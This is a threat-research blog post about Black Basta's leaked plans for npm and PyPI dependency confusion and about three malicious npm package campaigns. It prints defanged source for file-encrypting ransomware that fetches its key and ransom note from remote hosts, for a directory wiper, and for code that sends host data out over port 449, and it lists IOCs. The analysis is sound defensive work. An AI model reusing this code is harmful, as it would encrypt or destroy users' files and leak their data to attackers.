---
title: "Black Basta's Dependency Confusion Ambitions and Ransomware in Open Source Ecosystems"
short_title: "Black Basta's Dependency Confusion and Ransomware in OSS"
date: 2025-03-19 12:00:00 +0000
categories: [Malware, npm]
tags: [Ransomware, Dependency Confusion, npm, JavaScript, PyPI, Python, Typosquatting, Extortionware, T1195.002, T1608.001, T1204.002, T1059.007, T1546.016, T1595, T1005, T1082, T1041, T1571, T1105, T1119, T1486, T1657]
canonical_url: https://socket.dev/blog/black-basta-dependency-confusion-ambitions-and-ransomware-in-open-source-ecosystems
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/9cd3e88a305899be204926f04d4996e1f62ea57a-1024x1024.webp
  alt: "Black Basta's Dependency Confusion Ambitions and Ransomware in Open Source Ecosystems"
description: "Research uncovers Black Basta's plans to exploit package registries for ransomware delivery alongside evidence of similar attacks already targeting open source ecosystems."
---

Recent leaks of Black Basta's internal chat logs reveal the ransomware gang's intent to exploit open source ecosystems, particularly npm and PyPI, through dependency confusion attacks. While traditional ransomware deployment vectors like phishing, exploiting unpatched vulnerabilities, and compromised credentials dominate public attention, forensic analysis of Black Basta's communication logs confirms that the threat actors were actively looking to target open source package registries as part of their infiltration methodology.

This research examines two distinct but related threats: Black Basta's documented plans to deploy ransomware through dependency confusion attacks, and real-world examples of supply chain ransomware that other threat actors have already deployed. Together they demonstrate the increasing weaponization of open source ecosystems for ransomware delivery.

The Socket Threat Research Team has identified multiple malicious npm packages that exhibit ransomware-like and extortionware behaviors, confirming that threat actors are already leveraging package managers for malicious purposes.

In addition to exploring Black Basta's plans to deploy ransomware through open source ecosystems, this research investigates three empirical cases of supply chain attacks:

1. Ransomware-embedded packages that encrypt files using a remote key and drop a ransom note.
1. Wiper-like malware that irreversibly overwrites local files with a randomly generated AES key, exhibiting ransomware behavior without a decryption option.
1. Extortionware that silently exfiltrates host environment data, enabling blackmail, offensive reconnaissance, or further attacks.

![Example of a Black Basta ransomware note](https://cdn.sanity.io/images/cgdhsj6q/production/26adcc4fbfb218eeadc29085dc4221446bec3c05-700x434.png)
_Example of a Black Basta ransomware note, typically set as a victim's desktop wallpaper (Source: [Fortra](https://www.tripwire.com/state-of-security/black-basta-ransomware-what-you-need-to-know))._

## Black Basta's Intent to Infiltrate Open Source

In February 2025, an extensive [leak](https://github.com/D4RK-R4BB1T/BlackBasta-Chats/) of Black Basta's internal chat logs surfaced (*h/t* Risky Business's February 24, 2025, [newsletter](https://risky.biz/risky-bulletin-north-korean-hackers-steal-1-5-billion-from-bybit/)), offering a rare insight into the gang's operational strategy. These conversations reveal how Black Basta explored [dependency confusion](https://socket.dev/glossary/dependency-confusion) — a technique that exploits the tendency of certain package managers to prioritize public repositories over private ones. By creating malicious packages with names identical to private internal dependencies, the gang planned to deceive automated build processes into installing their code instead of legitimate software.

Despite citing notable real-world proofs of concept, including Alex Birsan's 2021 [research](https://socket.dev/blog/the-risks-of-misguided-research-in-supply-chain-security), and the [article](https://observationsinsecurity.com/2024/04/25/how-i-hacked-into-googles-internal-corporate-assets/) on Observations Insecurity, the Black Basta chat logs do not confirm any known exploitation. However, the conversations indicate that gang members planned to test the attack by uploading malicious packages to npm and PyPI for ransomware delivery. One participant was assigned to "try out" the attack vector in a local environment to determine whether modern Integrated Development Environments (IDEs) would automatically detect or remove suspicious packages.

![Recreated representation of Black Basta's internal chat logs](https://cdn.sanity.io/images/cgdhsj6q/production/fcfb3d7aaee17977ed824c9172a404410e908a99-750x1460.png)
_Recreated representation of translated text snippets from Black Basta's internal chat logs (originally in Russian, translated to English). The text content is authentic and accurately reflects the original conversations._

While Black Basta's plans remained in the exploratory phase, our independent threat research has uncovered multiple instances where other threat actors have successfully deployed ransomware through open source packages. These cases demonstrate that the attack vector Black Basta was considering is already being actively exploited through different technical approaches and by different actors.

## Ransomware Embedded in Code

Between 2022 and 2025, a threat actor under the npm alias **"xwlazssz"** published four packages: [`socket.oi`](https://socket.dev/npm/package/socket.oi/overview/4.5.1), [`ttp-error`](https://socket.dev/npm/package/ttp-error/overview/4.6.32), [`http-wrror`](https://socket.dev/npm/package/http-wrror/overview/2.5.85), and [`underscoer`](https://socket.dev/npm/package/underscoer/overview/1.17.21). These were typosquatted versions of legitimate, similarly named packages. Before their removal, the malicious packages were downloaded over 1,700 times, suggesting that at least some unsuspecting developers unknowingly installed them.

The threat actor embedded ransomware functionality within otherwise legitimate code. The following defanged [code](https://socket.dev/npm/package/http-wrror/files/2.5.85/index.js#L119) snippets, based on the authentic [`http-errors`](https://socket.dev/npm/package/http-errors) package, contains a malicious section inserted in the middle of the code.

```javascript
const crypto = require('crypto');
const fs = require('fs');
const http = require('http');
const AES_ALGORITHM = 'aes-256-cbc';

// Fetch AES encryption key from attacker's remote server
http.get('hxxp://dasdv.free.beeceptor[.]com/spc4kzs', function (res){
    res.on('data', function (resp){
        const key = resp.toString('utf8');

        function aesEncrypt(message){
            const aes = crypto.createCipher(AES_ALGORITHM, key);
            let encryptedBuffer = aes.update(message);
            encryptedBuffer = Buffer.concat([encryptedBuffer, aes.final()]);
            return encryptedBuffer;
        }

        const { execSync } = require('child_process');

        // Locate all files in common system directories
        const files = execSync('find ~ /home /tmp /var /srv /opt -type f').toString('utf8').split('\n');

        // Encrypt and overwrite each discovered file
        files.forEach((filePath) => {
            if (filePath) {
                const fileContent = fs.readFileSync(filePath);
                const encryptedContent = aesEncrypt(fileContent);
                fs.writeFileSync(filePath, encryptedContent);
            }
        });
    });
});

// Download ransom note from attacker's server
let rnsNote = fs.createWriteStream('./whathappenedbroreadme.txt');
http.get('hxxp://dgfgr.free.beeceptor[.]com/g3yz0a54x.txt', function(resp) {
    resp.pipe(rnsNote);
});

rnsNote.on('finish', () => {

    // Display ransom note to the victim
    const readinfo = fs.readFileSync('./whathappenedbroreadme.txt');
    console.log(readinfo.toString('utf8'));
});
```

The malicious script relies on a remote AES key retrieval mechanism, fetching an encryption key from an external server at `hxxp://dasdv.free.beeceptor[.]com/spc4kzs`. This approach ensures that decryption is nearly impossible if the server becomes unavailable, effectively locking victims out of their files permanently. At the time of our analysis, the server was already down.

Once the key is obtained, the script scans and encrypts files using the `find` command to locate files within common directories, such as `~`, `/home`, `/tmp`, `/var`, `/srv`, and `/opt`. Using `child_process.execSync('find ~ /home /tmp /var /srv /opt -type f')`, on Unix-like systems, it recursively lists files before encrypting and overwriting them with the remotely retrieved AES key. This ensures that nearly all user-accessible files within these directories are rendered inaccessible.

To reinforce its extortion scheme, the script downloads and displays a ransom note from `hxxp://dgfgr.free.beeceptor[.]com/g3yz0a54x.txt`. This file is written to disk as `whathappenedbroreadme.txt` and then displayed to the victim, informing them that their files have been encrypted and providing instructions for potential decryption — likely in exchange for payment.

![Socket AI Scanner flags socket.oi package](https://cdn.sanity.io/images/cgdhsj6q/production/1f9a8d2ef51b05c81914af8ecc8fd53dacc2c098-1479x601.png)
_Socket AI Scanner flags `socket.oi` package as known malware and part of a potential typosquatting attack._

## Wiper-Like Ransomware

In February 2025, a threat actor under the npm alias "scorpionhantu" published four malicious packages — [`hantu`](https://socket.dev/npm/package/hantu/overview/1.0.3), [`dinacomgraph`](https://socket.dev/npm/package/dinacomgraph/overview/1.0.4), [`socketdinacom`](https://socket.dev/npm/package/socketdinacom/overview/1.0.1), and [`setan`](https://socket.dev/npm/package/setan/overview/1.0.3) — which were promptly taken down by the npm registry shortly after publication. The script embedded in `setan` was designed to overwrite local files using a randomly generated AES key, rendering them permanently inaccessible. Below is a [code](https://socket.dev/npm/package/setan/files/1.0.3/setan.js#L6) snippet showcasing the malicious function:

```javascript
var CryptoJS = require("crypto-js");
const { v4: uuidv4 } = require('uuid');
const fs = require('fs');

function genderuwo() {
    // Generate a random AES encryption key (not stored or transmitted)
    var ciphertext = CryptoJS.AES.encrypt('my message', uuidv4()).toString();

    // Get the current directory path
    const directoryPath = __dirname;

    fs.readdir(directoryPath, (err, files) => {
        if (err) {
            return console.error(`Failed to read directory: ${err.message}`);
        }

        // Exclude the script itself to prevent self-overwriting
        files = files.filter((item) => item !== 'setan.js');

        // Overwrite all files in the directory with encrypted data, making them unrecoverable
        files.forEach((item) => {
            fs.writeFile(item, ciphertext, function (err) {
                if (err) throw err;
                console.log(`File encrypted: ${item}`);
            });
```

The script generates an AES encryption key locally using `uuidv4()`, but it never stores or transmits the key. As a result, any files it encrypts are permanently lost, with no possibility of recovery.

Once executed, the script systematically overwrites every file in the current directory, excluding itself. This ensures that all targeted data is irreversibly encrypted, effectively rendering it useless. Unlike traditional ransomware, which typically demands payment in exchange for a decryption key, this script functions more like a wiper — there is no ransom note, no communication with a command and control (C2) server, and no method for victims to recover their files.

It lacks the extortion component of conventional ransomware but directly impacts data integrity by rendering files permanently inaccessible. The intent is to disrupt systems and cause irreversible damage rather than steal data or demand a ransom. This distinction underscores its destructive nature, making it a particularly harmful strain of malware despite its absence of direct financial motivation.

![Malicious packages published by scorpionhantu](https://cdn.sanity.io/images/cgdhsj6q/production/377dc46d2c25838e4c590e6db56027384aa81890-1817x1324.png)
_Screenshot of malicious packages published by "scorpionhantu" prior to removal from the npm registry._

## Extortionware

Between 2024 and 2025, an npm user operating under the aliases "exzuperi10" and "exzuperi14" published three malicious package versions (213.21.24): [`preview-api`](https://socket.dev/npm/package/preview-api/overview/213.21.24), [`lang-json`](https://socket.dev/npm/package/lang-json/overview/213.21.24), and [`android-arm64`](https://socket.dev/npm/package/android-arm64/overview/213.21.24). Before their removal, these packages accumulated over 600 downloads, indicating that some unsuspecting developers may have installed them.

Unlike ransomware, which encrypts data and demands payment for decryption, extortionware focuses on data theft and the threat of public disclosure, often accompanied by other malicious actions. In some cases, threat actors demand payment to prevent the release of stolen information, leveraging fear and reputational damage rather than encryption-based extortion.

The [script](https://socket.dev/npm/package/preview-api/files/213.21.24/index.js#L33) embedded in the malicious packages is designed to silently collect and exfiltrate system environment data, transmitting it to a remote server over a non-standard port:

```javascript
const os = require("os");
const dns = require("dns");
const querystring = require("querystring");
const https = require("https");
const packageJSON = require("./package.json");
const packageName = packageJSON.name;

// Collect system environment details for exfiltration
const trackingData = JSON.stringify({
    hd: os.homedir(),    // User's home directory
    hn: os.hostname(),   // Machine hostname
    ls: __dirname,       // Current script directory
    pn: packageName,     // Package name
});

// Send stolen data to attacker's remote server over port 449
const options = {
    hostname: "exzuperi.ftp[.]sh",
    port: 449,
    path: `/PoC/${encodeURIComponent(trackingData)}`,
    method: "GET",
};

const req = https.request(options, (res) => {
    res.on("data", () => { /* Ignore response from attacker */ });
});

req.on("error", (e) => {
    console.error(e);
});

req.end();

// Display a Telegram contact for potential buyers of the stolen data
process.stdout.write("You can reach me, if you want to buy it: hxxps://t[.]me/exzuperi");
```

The script operates silently, collecting system information — including home directory paths, hostnames, and other environment details — without the user's knowledge or consent. To avoid detection, it transmits the stolen data over port 449, a non-standard port that can bypass some basic network monitoring and security controls. The data is sent to an attacker-controlled server, where it can be stored, analyzed, or sold.

The script also displays a Telegram contact link, inviting potential buyers to negotiate a price for the stolen information. This suggests a clear monetization strategy, whether through direct extortion, resale, or use in future targeted attacks.

Although it does not encrypt files like traditional ransomware, extortionware can be equally damaging. The theft of system environment data can facilitate further intrusions, blackmail attempts, or offensive reconnaissance. Even seemingly minor leaks may violate compliance regulations, leading to legal and reputational consequences for affected organizations.

## Outlook and Recommendations

Ransomware in the open source supply chains is not a distant threat — it is a clear and immediate danger that demands ongoing attention. The leaked Black Basta chat logs expose a sophisticated ransomware gang exploring ways to exploit open source ecosystems at scale. While the success of their efforts remains uncertain, real-world evidence from npm confirms that ransomware-like and extortionware packages are routinely infiltrating public repositories. Threat actors have repeatedly demonstrated that package registries can be weaponized for destructive encryption, data exfiltration, and ransom demands.

As organizations increasingly rely on open source software, proactive monitoring and secure development practices are more important than ever. Software supply chain attacks — especially those involving ransomware — can cripple entire organizations, leading to operational disruptions, financial loss, and reputational damage.

Strengthening supply chain security is critical to protecting both businesses and the broader software ecosystem, and by integrating Socket's free real-time scanning and monitoring tools — including the [GitHub app](https://socket.dev/features/github), [CLI](https://socket.dev/features/cli), and [browser extension](https://socket.dev/features/web-extension) — organizations can detect and block malicious dependencies before they reach production environments.

## Indicators of Compromise (IOCs)

### Malicious npm Packages

- `socket.oi`
- `ttp-error`
- `http-wrror`
- `underscoer`
- `hantu`
- `dinacomgraph`
- `socketdinacom`
- `setan`
- `preview-api` (version 213.21.24)
- `lang-json` (version 213.21.24)
- `android-arm64` (version 213.21.24)

### Threat Actor Identifiers

#### npm Aliases:

- `xwlazssz`
- `scorpionhantu`
- `exzuperi10`
- `exzuperi14`

#### C2 Endpoints:

- `hxxp://dasdv.free.beeceptor[.]com/spc4kzs`
- `hxxp://dgfgr.free.beeceptor[.]com/g3yz0a54x.txt`
- `hxxp://exzuperi.ftp[.]sh:449`

## MITRE ATT&CK Techniques

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1608.001 — Stage Capabilities: Upload Malware
- T1204.002 — User Execution: Malicious File
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1546.016 — Event Triggered Execution: Installer Packages
- T1595 — Active Scanning
- T1005 — Data from Local System
- T1082 — System Information Discovery
- T1041 — Exfiltration Over C2 Channel
- T1571 — Non-Standard Port
- T1105 — Ingress Tool Transfer
- T1119 — Automated Collection
- T1486 — Data Encrypted for Impact
- T1657 — Financial Theft
